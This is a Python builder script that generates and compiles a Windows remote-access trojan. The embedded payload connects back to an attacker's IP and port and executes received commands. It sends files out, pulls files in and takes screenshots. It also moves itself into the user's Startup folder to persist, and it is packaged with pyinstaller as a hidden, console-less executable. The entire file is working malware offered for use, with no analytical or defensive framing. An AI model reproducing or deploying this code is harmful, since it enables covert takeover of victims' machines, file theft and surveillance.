import os
import sys

def create_trojan_windows(ip, port):
    trojan = r"""
import os
import getpass
import shutil
import socket
import sys
import time
import threading
import pyautogui
import encodings.idna


class Trojan():

    stopprogram = 1
    __direcgo = 0
    __start = 0
    __ip = '"""+ip+"""'
    __port = """+port+r"""
    pictur = 0

    BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

    
    def __init__(self):
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.port = self.__port
            self.s.connect((self.__ip, self.port))

            self.while_run()

        except:
            pass

        
    #-----------------------------------------
    def while_run(self):
        while True:
            self.directorystart()
            self.datas = self.s.recv(1024).decode('utf-8')

            if self.datas == 'exit':
                self.exit()

            elif self.datas == 'stop':
                self.stop()

            elif self.datas == '[pictur]':
                self.pictursave()

            elif self.datas[:2] == 'cd':
                self.directorygo(self.datas[3:])        

            elif self.datas[:2] == 'd$':
                self.file_download(self.datas[2:])

            elif self.datas[0] == '$':
                self.file_send(self.datas[1:])

            else:
                self.command_send(self.datas)


    #-----------------------------------------
    def pictursave(self):
        try:
            pictur = pyautogui.screenshot("pictur.png")
        except:
            pass

    #-----------------------------------------
    def file_download(self, command):
        self.f = open(command, 'wb')
        self.data = self.s.recv(1024)

        while self.data:
            if self.data[-4:] == b'None':
                self.f.write(self.data[:-4])
                self.f.close()
                break

            self.f.write(self.data)
            self.data = self.s.recv(1024)


    #-----------------------------------------
    def file_send(self, command):
        try:
            self.f = open(command, 'rb')
            self.data = self.f.read()

            while self.data != bytes("".encode()):
                self.s.send(self.data)
                self.data = self.f.read()

            self.f.close()
            self.data = 'None'
            self.s.send(self.data.encode('utf-8'))

        except:
            self.s.send(bytes('None'.encode("utf-8")))

    #-----------------------------------------

    def directorystart(self):
        if self.__start == 0:
            self.directory = os.getcwd()
            self.directory = '{}{}{}{}{}>{}'.format(self.GREEN, self.directory[:2], self.END, self.BLUE, self.directory[2:], self.END)
            self.s.sendall(bytes(self.directory.encode("utf-8")))
            self.__start = 1

        else:
            pass


    #-----------------------------------------
    def directorygo(self, command):
        try:
            command = command.strip()

            if command == '-' and self.__direcgo != 0:
                self.present1 = self.present
                self.present = os.getcwd()
                os.chdir(self.present1)
                self.__start = 0

            elif command == '-' and self.__direcgo == 0:
                self.__start = 0

            elif os.path.isdir(command) == True: # dizinin var olup olmadigini yoxlayiram
                self.present = os.getcwd()
                os.chdir(command)
                self.__start = 0
                self.__direcgo = 1

            else:
                self.__start = 0

        except:
            self.__start = 0

    #-----------------------------------------
    def command_send(self, data):
        try:
            data = data.strip()
            if data == 'ls' or data == 'dir':
                self.dongu = os.listdir()

                self.command = ''
                for self.i in self.dongu:
                    self.command += '{}\n'.format(self.i)

                self.command = self.command.strip()

            elif data == 'pwd':
                self.command = os.getcwd()
                self.command = str(self.command)

            else:
                #self.command = os.popen(data).read()
                os.system(data)
                self.command = 'Command run'


            self.s.send(bytes(self.command.encode('utf-8', errors = 'repalce')))
            self.s.send(bytes("None".encode("utf-8")))

        except:
            self.s.send(bytes("NoneC".encode("utf-8")))


    #---------------------------------------
    def exit(self):
        self.s.close()
        self.stopprogram = 0

    #--------------------------------------
    def stop(self):
        self.s.close()
        self.stopprogram = 1
        
        


#---------------------------------------
def start_trojan():
        trojan = Trojan()

        while trojan.stopprogram == 1:
            time.sleep(180)
            trojan = Trojan()

        sys.exit()

#----------------------------------------
def main():
    user_name = getpass.getuser()
    directory = os.getcwd()
    directory2 =  r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(user_name)
    file_name = sys.argv[0]

    if directory == directory2 or directory == 'C:\Windows\system32':
        start_trojan()

    else:
        shutil.move(file_name, directory2)
        start_trojan()


#----------------------------------------
def start_program():
        main()

#---------------------------------------
start_program()
#--------------------------------------
"""
    dosya = open('tromux.py', 'w')
    dosya.write(trojan)
    dosya.close()
    islem = os.getenv("HOME")
    islem = "{}/.wine/drive_c/Python34/Scripts/pyinstaller.exe --onefile --noconsole tromux.py".format(islem)
    islem = 'wine {}'.format(islem)
    os.system(islem)
    os.system('rm -r build __pycache__ tromux.py tromux.spec')
    dizin = os.getcwd()
    islem = 'mv dist/tromux.exe {}'.format(dizin)
    os.system(islem)
    os.system('rm -r dist')

